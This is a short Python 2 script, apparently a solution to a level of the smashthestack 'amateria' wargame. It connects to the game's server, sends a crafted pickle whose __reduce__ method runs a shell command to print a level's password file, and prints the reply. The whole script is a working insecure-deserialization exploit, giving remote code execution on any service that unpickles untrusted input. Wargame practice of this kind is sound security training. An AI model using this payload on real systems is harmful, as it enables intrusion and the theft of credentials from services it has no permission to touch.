#!/usr/bin/python

import socket
import cPickle
import subprocess

host = "amateria.smashthestack.org"
port = 54321
password = "/home/level1/password"

class Execute(object):
	def __reduce__(self):
		return(subprocess.call, (('cat', password), 0, None, 4, 4, 4))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)

cmd = cPickle.dumps(Execute())
s.send(cmd)

print("%s") % (s.recv(1024)).strip('\n')